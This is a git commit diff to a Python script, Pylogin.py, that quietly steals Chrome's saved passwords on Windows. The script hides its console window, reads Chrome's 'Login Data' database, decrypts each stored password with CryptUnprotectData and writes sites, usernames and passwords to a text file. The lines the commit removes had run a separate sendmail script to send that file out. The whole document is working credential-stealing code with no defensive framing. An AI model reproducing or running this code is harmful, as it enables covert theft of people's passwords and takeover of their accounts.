30f84f3e8d49e5afc2fb694104683d71690c16e0
Luis Garcia Calzada <luisxciv@gmail.com>
2017-11-17 19:32:05 -0600

    imports

--- Pylogin.py
+++ Pylogin.py
@@ -1,26 +1,19 @@
 #!/usr/bin/env python
-
 from os import getenv
 import sqlite3
 import win32crypt
 import os
-#If we want to hide the console for whatever reason
 import win32console, win32gui
 window = win32console.GetConsoleWindow()
 win32gui.ShowWindow(window, 0)
-
-#Lets Connect to the Database
-conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") #Default chrome location for details
+conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
 connection = conn.cursor()
 conn.execute("PRAGMA busy_timeout = 300000")
 connection.execute('Select action_url, username_value, password_value FROM logins')
-# make the file
-f = open("Chromepass.txt", "a+")
 
-# we write to the file
+f = open("Chromepass.txt", "a+")
 f.write("Chrome Saved Passwords\n")
 
-#Here the Crpyunprotectdata module comes into play. It decrypts the dtaa with the login credentials of the logged in user.
 for result in connection.fetchall():
 
     password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
@@ -32,6 +25,3 @@ for result in connection.fetchall():
         f.write('\nPassword: ' + str(password))
 
 
-    ## lets send the file now, rune the sendmail script
-
-os.system('py sendmail.py')
